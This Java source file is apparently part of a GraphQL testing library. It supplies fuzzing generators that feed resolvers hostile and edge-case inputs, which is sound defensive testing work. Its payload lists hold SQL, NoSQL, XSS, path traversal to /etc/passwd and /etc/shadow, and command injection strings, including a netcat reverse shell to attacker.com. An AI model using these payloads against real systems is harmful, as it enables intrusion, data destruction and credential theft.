package com.snowedunderproductions.graphprobe.jqwik.arbitraries;

import net.jqwik.api.Arbitraries;
import net.jqwik.api.Arbitrary;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

/**
 * Specialised {@link net.jqwik.api.Arbitrary} generators for fuzzing GraphQL APIs and
 * verifying resolver robustness under hostile or edge-case inputs.
 *
 * <p>All methods are static and the class is not instantiable.  Generators are grouped
 * into four areas:
 * <ul>
 *   <li><strong>Injection attacks</strong> — SQL ({@link #sqlInjectionPayloads()}),
 *       NoSQL ({@link #noSqlInjectionPayloads()}), XSS ({@link #xssPayloads()}),
 *       path traversal ({@link #pathTraversalPayloads()}), command injection
 *       ({@link #commandInjectionPayloads()}), and a combined
 *       {@link #injectionPayloads()} aggregate.</li>
 *   <li><strong>Edge cases and boundary values</strong> — oversized strings
 *       ({@link #extremelyLongStrings()}), special Unicode
 *       ({@link #specialUnicodeCharacters()}), numeric boundaries
 *       ({@link #numericBoundaryValues()}), and empty/whitespace values
 *       ({@link #emptyAndWhitespace()}).</li>
 *   <li><strong>GraphQL-specific abuse patterns</strong> — deeply nested queries
 *       ({@link #deeplyNestedQueries(int)}), excessive field selections
 *       ({@link #excessiveFieldSelections(int)}), circular references
 *       ({@link #circularReferences()}), malformed syntax
 *       ({@link #malformedGraphQL()}), and invalid argument types
 *       ({@link #invalidArgumentTypes()}).</li>
 *   <li><strong>Batch attack patterns</strong> — query batching abuse
 *       ({@link #batchQueryAttack(int)}) and alias multiplication
 *       ({@link #aliasMultiplication(int)}).</li>
 * </ul>
 *
 * <h3>Security testing example</h3>
 * <pre>{@code
 * @GraphQLProperty(tries = 50)
 * void testGraphQLQueryRejectsInjection(@ForAll("sqlInjectionAttempts") String input) {
 *     GraphQLTestClient client = new GraphQLTestClient();
 *     TestResponse response = client.executeQueryOrPossibleSpecificError(
 *         String.format("{ user(id: \"%s\") { name } }", input),
 *         Optional.empty(),
 *         Optional.of("Invalid input")
 *     );
 *     // Should either error gracefully or sanitise input
 *     assertThat(response.hasError() || !response.containsData("DROP")).isTrue();
 * }
 *
 * @Provide
 * Arbitrary<String> sqlInjectionAttempts() {
 *     return GraphQLFuzzingArbitraries.injectionPayloads();
 * }
 * }</pre>
 *
 * <h3>Edge-case testing example</h3>
 * <pre>{@code
 * @GraphQLProperty
 * void testHandlesExtremelyLongStrings(@ForAll("extremeStrings") String input) {
 *     // Confirm the API handles or rejects oversized inputs without a 500 error
 *     assertThat(input.length()).isGreaterThan(1000);
 * }
 *
 * @Provide
 * Arbitrary<String> extremeStrings() {
 *     return GraphQLFuzzingArbitraries.extremelyLongStrings();
 * }
 * }</pre>
 *
 * @see GraphQLArbitraries
 * @see DatabaseArbitraryProvider
 * @see com.snowedunderproductions.graphprobe.jqwik.annotations.GraphQLProperty
 * @since 1.0.0
 */
public final class GraphQLFuzzingArbitraries {

    private GraphQLFuzzingArbitraries() {
        throw new AssertionError("Utility class should not be instantiated");
    }

    // ==================== Injection Attack Patterns ====================

    /**
     * Generates common SQL injection patterns.
     * <p>
     * Use to test that GraphQL resolvers properly sanitise database queries.
     * </p>
     *
     * @return arbitrary producing SQL injection payloads
     */
    public static Arbitrary<String> sqlInjectionPayloads() {
        return Arbitraries.of(
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "'; DELETE FROM users WHERE ''='",
            "1'; WAITFOR DELAY '00:00:05'--"
        );
    }

    /**
     * Generates NoSQL injection patterns (e.g., MongoDB).
     *
     * @return arbitrary producing NoSQL injection payloads
     */
    public static Arbitrary<String> noSqlInjectionPayloads() {
        return Arbitraries.of(
            "{\"$gt\":\"\"}",
            "{\"$ne\":null}",
            "{\"$regex\":\".*\"}",
            "'; return true; var foo='",
            "{\"$where\":\"this.password.length > 0\"}",
            "'; return 'a' == 'a' && ''=='",
            "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"
        );
    }

    /**
     * Generates XSS (Cross-Site Scripting) attack patterns.
     * <p>
     * Use to test that GraphQL responses properly escape user-generated content.
     * </p>
     *
     * @return arbitrary producing XSS payloads
     */
    public static Arbitrary<String> xssPayloads() {
        return Arbitraries.of(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src='x' onerror='alert(document.cookie)'>"
        );
    }

    /**
     * Generates path traversal attack patterns.
     *
     * @return arbitrary producing path traversal payloads
     */
    public static Arbitrary<String> pathTraversalPayloads() {
        return Arbitraries.of(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "../../../../../../etc/shadow",
            "..%252f..%252f..%252fetc%252fpasswd"
        );
    }

    /**
     * Generates command injection patterns.
     *
     * @return arbitrary producing command injection payloads
     */
    public static Arbitrary<String> commandInjectionPayloads() {
        return Arbitraries.of(
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(uname -a)",
            "; cat /etc/passwd #",
            "| nc -e /bin/sh attacker.com 4444"
        );
    }

    /**
     * Generates a mix of all injection attack patterns.
     *
     * @return arbitrary producing various injection payloads
     */
    public static Arbitrary<String> injectionPayloads() {
        return Arbitraries.oneOf(
            sqlInjectionPayloads(),
            noSqlInjectionPayloads(),
            xssPayloads(),
            pathTraversalPayloads(),
            commandInjectionPayloads()
        );
    }

    // ==================== Edge Cases & Boundary Values ====================

    /**
     * Generates extremely long strings (1KB to 10MB).
     * <p>
     * Use to test API behaviour with oversized inputs.
     * </p>
     *
     * @return arbitrary producing very long strings
     */
    public static Arbitrary<String> extremelyLongStrings() {
        return Arbitraries.integers()
            .between(1_000, 10_000_000)
            .map(length -> "A".repeat(length));
    }

    /**
     * Generates extremely long strings with specified size range.
     *
     * @param minLength minimum string length
     * @param maxLength maximum string length
     * @return arbitrary producing long strings in the specified range
     */
    public static Arbitrary<String> extremelyLongStrings(int minLength, int maxLength) {
        return Arbitraries.integers()
            .between(minLength, maxLength)
            .map(length -> "A".repeat(length));
    }

    /**
     * Generates strings with special Unicode characters.
     *
     * @return arbitrary producing strings with special characters
     */
    public static Arbitrary<String> specialUnicodeCharacters() {
        return Arbitraries.of(
            "\u0000",           // Null character
            "\uFEFF",           // Zero-width no-break space
            "\u202E",           // Right-to-left override
            "🚀💥🔥",          // Emojis
            "﷽",                // Arabic ligature
            "𝕳𝖊𝖑𝖑𝖔",         // Mathematical alphanumeric symbols
            "Ⓗⓔⓛⓛⓞ",          // Enclosed alphanumerics
            "　",               // Ideographic space
            "\r\n\t",           // Control characters
            "''\"\"``"          // Various quote marks
        );
    }

    /**
     * Generates numeric boundary values (min/max for common types).
     *
     * @return arbitrary producing boundary numeric values
     */
    public static Arbitrary<String> numericBoundaryValues() {
        return Arbitraries.of(
            "0",
            "-0",
            "1",
            "-1",
            String.valueOf(Integer.MAX_VALUE),
            String.valueOf(Integer.MIN_VALUE),
            String.valueOf(Long.MAX_VALUE),
            String.valueOf(Long.MIN_VALUE),
            String.valueOf(Double.MAX_VALUE),
            String.valueOf(Double.MIN_VALUE),
            "9007199254740992",  // MAX_SAFE_INTEGER (JavaScript)
            "-9007199254740992", // MIN_SAFE_INTEGER (JavaScript)
            "Infinity",
            "-Infinity",
            "NaN"
        );
    }

    /**
     * Generates empty and whitespace-only strings.
     *
     * @return arbitrary producing empty/whitespace strings
     */
    public static Arbitrary<String> emptyAndWhitespace() {
        return Arbitraries.of(
            "",
            " ",
            "   ",
            "\t",
            "\n",
            "\r\n",
            "     \t\n  "
        );
    }

    // ==================== GraphQL-Specific Patterns ====================

    /**
     * Generates deeply nested GraphQL query fragments to test depth-limiting and
     * stack-overflow protection in resolvers.
     *
     * <p>Nesting depth is chosen uniformly at random in the range
     * {@code [5, maxDepth]}, so {@code maxDepth} must be at least {@code 5}.
     * The generated fragments follow the pattern
     * {@code { user { friends { friends … { id } … } } }}.
     *
     * @param maxDepth maximum nesting depth (must be {@literal >=} 5)
     * @return arbitrary producing nested query fragments with depth between 5 and {@code maxDepth}
     */
    public static Arbitrary<String> deeplyNestedQueries(int maxDepth) {
        return Arbitraries.integers()
            .between(5, maxDepth)
            .map(depth -> {
                StringBuilder query = new StringBuilder("{ user ");
                for (int i = 0; i < depth; i++) {
                    query.append("{ friends ");
                }
                query.append("{ id }");
                for (int i = 0; i < depth; i++) {
                    query.append(" }");
                }
                query.append(" }");
                return query.toString();
            });
    }

    /**
     * Generates queries with excessive field selections.
     * <p>
     * Use to test query complexity limiting.
     * </p>
     *
     * @param fieldCount number of fields to select
     * @return arbitrary producing queries with many fields
     */
    public static Arbitrary<String> excessiveFieldSelections(int fieldCount) {
        return Arbitraries.just(
            "{ user { " +
            IntStream.range(0, fieldCount)
                .mapToObj(i -> "field" + i)
                .collect(Collectors.joining(" ")) +
            " } }"
        );
    }

    /**
     * Generates queries with circular references.
     * <p>
     * Use to test circular query detection.
     * </p>
     *
     * @return arbitrary producing circular query patterns
     */
    public static Arbitrary<String> circularReferences() {
        return Arbitraries.of(
            "{ user { friends { user { friends { user { id } } } } } }",
            "{ post { author { posts { author { posts { id } } } } } }",
            "{ organization { members { organization { members { id } } } } }"
        );
    }

    /**
     * Generates malformed GraphQL query syntax.
     * <p>
     * Use to test parser error handling.
     * </p>
     *
     * @return arbitrary producing malformed queries
     */
    public static Arbitrary<String> malformedGraphQL() {
        return Arbitraries.of(
            "{",                          // Unclosed brace
            "{ user",                     // Missing closing
            "{ user { id }",              // Missing outer closing
            "user { id }",                // Missing outer braces
            "{ user { id } } }",          // Extra closing brace
            "{ user id } }",              // Missing nested braces
            "{ user { id name } }",       // Missing commas (valid in GraphQL)
            "query { { user { id } }",    // Double opening
            "",                           // Empty query
            "   ",                        // Whitespace only
            "null",                       // Null query
            "{ user(id: ) { name } }",    // Missing argument value
            "{ user(: \"123\") { id } }", // Missing argument name
            "{ 123user { id } }"          // Invalid field name
        );
    }

    /**
     * Generates queries with invalid argument types.
     *
     * @return arbitrary producing type mismatch scenarios
     */
    public static Arbitrary<String> invalidArgumentTypes() {
        return Arbitraries.of(
            "{ user(id: [1,2,3]) { name } }",           // Array instead of scalar
            "{ user(id: {foo: \"bar\"}) { name } }",    // Object instead of scalar
            "{ user(id: true) { name } }",              // Boolean instead of string
            "{ user(limit: \"ten\") { name } }",        // String instead of int
            "{ user(active: \"yes\") { name } }"        // String instead of boolean
        );
    }

    // ==================== Batch Attack Patterns ====================

    /**
     * Generates batch query attacks (query batching abuse).
     * <p>
     * Use to test batch query limiting.
     * </p>
     *
     * @param batchSize number of queries in the batch
     * @return arbitrary producing batched queries
     */
    public static Arbitrary<String> batchQueryAttack(int batchSize) {
        return Arbitraries.just(
            "[" +
            IntStream.range(0, batchSize)
                .mapToObj(i -> "{\"query\":\"{ user(id: \\\"" + i + "\\\") { id name } }\"}")
                .collect(Collectors.joining(",")) +
            "]"
        );
    }

    /**
     * Generates alias-based query multiplication attacks.
     * <p>
     * Use to test query cost analysis and rate limiting.
     * </p>
     *
     * @param aliasCount number of aliases
     * @return arbitrary producing aliased queries
     */
    public static Arbitrary<String> aliasMultiplication(int aliasCount) {
        return Arbitraries.just(
            "{ " +
            IntStream.range(0, aliasCount)
                .mapToObj(i -> "alias" + i + ": user(id: \"" + i + "\") { id name email }")
                .collect(Collectors.joining(" ")) +
            " }"
        );
    }

    // ==================== Combined Fuzzing ====================

    /**
     * Generates a mix of all fuzzing patterns for comprehensive testing.
     *
     * @return arbitrary producing various attack and edge case patterns
     */
    public static Arbitrary<String> allFuzzingPatterns() {
        return Arbitraries.oneOf(
            injectionPayloads(),
            specialUnicodeCharacters(),
            numericBoundaryValues(),
            emptyAndWhitespace(),
            deeplyNestedQueries(10),
            malformedGraphQL(),
            invalidArgumentTypes()
        );
    }
}
